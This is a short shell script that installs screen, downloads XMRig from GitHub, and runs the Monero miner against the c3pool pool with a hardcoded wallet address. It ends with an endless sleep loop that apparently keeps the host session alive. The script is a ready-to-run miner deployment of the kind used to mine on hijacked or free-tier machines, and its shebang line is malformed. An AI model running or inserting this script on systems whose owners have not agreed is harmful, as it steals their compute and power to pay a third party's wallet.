#!bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz
tar xf xmrig-6.16.3-linux-x64.tar.gz
cd xmrig-6.16.3
./xmrig -o auto.c3pool.org:17777 -a rx -k -u 875cSnqJjxFUjwhD5eSKH5WdeA6e8on3GYQ5BnqCJdtyGw7p4Juv4wddjr7YcsjDFecoznkw718MUQsu23bcTCNd2YXpGjZ
while [ 1 ]; do
sleep 3
done
sleep 999
